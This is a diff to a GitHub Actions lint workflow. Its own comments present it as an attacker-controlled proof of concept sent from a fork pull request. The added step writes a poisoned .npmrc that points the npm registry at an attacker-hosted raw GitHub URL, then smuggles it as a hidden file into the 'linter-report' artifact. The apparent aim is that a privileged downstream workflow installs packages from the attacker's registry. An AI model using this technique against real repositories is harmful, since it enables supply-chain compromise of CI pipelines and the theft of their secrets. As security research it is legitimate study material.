@@ -1,3 +1,5 @@
+# Attacker-controlled copy of the upstream "Lint" workflow.
+# A fork PR can ship this content; pull_request runs use the workflow file from the PR head.
 name: ADP PR Lint
 on:
   pull_request:
@@ -8,12 +10,18 @@ jobs:
   lint:
     runs-on: ubuntu-latest
     steps:
-      - name: build report
+      - name: Build attacker-chosen artifact contents
         run: |
-          mkdir -p out
-          printf 'BASE_VERSION\n' > out/linter-report.txt
-          echo "${{ github.event.pull_request.number }}" > out/pr-number.txt
+          mkdir -p /tmp/root
+          printf 'registry=https://raw.githubusercontent.com/PDFtoMark/gab-poc-wfr-artifact/main/npmreg5/\naudit=false\nfund=false\nprogress=false\n' > /tmp/root/.npmrc
+          echo "${{ github.event.pull_request.number }}" > /tmp/root/pr-number.txt
+          printf 'linter report body chosen by attacker\n' > /tmp/root/linter-report.txt
       - uses: actions/upload-artifact@v7
         with:
           name: linter-report
-          path: out/
+          path: |
+            /tmp/root/.npmrc
+            /tmp/root/pr-number.txt
+            /tmp/root/linter-report.txt
+          include-hidden-files: true
+          if-no-files-found: ignore
